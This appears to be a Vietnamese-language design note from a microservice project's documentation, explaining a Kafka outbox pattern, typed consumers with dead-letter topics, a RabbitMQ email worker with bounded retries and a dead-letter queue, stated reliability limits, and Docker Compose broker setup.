Tại [`EmailTaskConsumer.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-notification-service/src/main/java/com/ocbs/service/EmailTaskConsumer.java):
- Giới hạn 3 lần retry nội bộ trước khi ném `AmqpRejectAndDontRequeueException` để đưa email thất bại sang `opcbs.email.dlq`.
- Đảm bảo hàng đợi chính không bao giờ bị nghẽn bởi một địa chỉ email không hợp lệ.

### What / Why / How — Bảo đảm event và email không mất khi service/broker lỗi

**What:** Auth và Payment ghi domain event vào outbox cùng transaction dữ liệu. Notification dùng consumer Kafka có kiểu riêng theo từng contract; email là task JSON trên RabbitMQ với publisher confirm, retry và DLQ.

**Why:** Gửi Kafka bằng callback `afterCommit` có khoảng hở: database đã commit nhưng process có thể dừng trước khi broker nhận message. Dùng chung Appointment deserializer cho Payment/User cũng khiến consumer nhận sai kiểu payload. Với email, `@Async void` và nuốt lỗi SMTP có thể khiến Rabbit ACK trước khi email thực sự được gửi.

**How:** Producer serialize event thành JSON và lưu payload, event ID, aggregate key, trạng thái, thời điểm thử lại trong bảng outbox. Relay đợi broker ACK rồi mới đánh dấu `SENT`; lỗi được retry với backoff, quá ngưỡng giữ `FAILED` để xử lý. Notification cấu hình riêng Appointment/Payment/User DTO và DLT. Email worker gửi đồng bộ, chỉ ghi inbox/ACK sau SMTP thành công; Rabbit retry tối đa ba lần rồi chuyển DLQ.

**Giới hạn:** Kafka KRaft hiện là một broker, replication factor 1 nên không có HA khi broker hỏng; outbox giữ lại event để relay sau khi broker hồi phục. Email SMTP và ghi inbox không thể tạo exactly-once end-to-end; inbox giảm gửi lặp nhưng sự cố ngay sau khi SMTP nhận mail vẫn có thể cần đối soát thủ công.

#### 4. Khởi Chạy Trong Môi Trường Docker Compose
File `docker/docker-compose.prod.yml` bổ sung:
- Container `rabbitmq:3.13-management-alpine` với healthcheck `rabbitmq-diagnostics -q ping`.
- Cấu hình biến môi trường kết nối Kafka và RabbitMQ cho các microservices liên quan.
- Tách biệt mạng `opcbs-backend-net` cô lập broker khỏi internet.

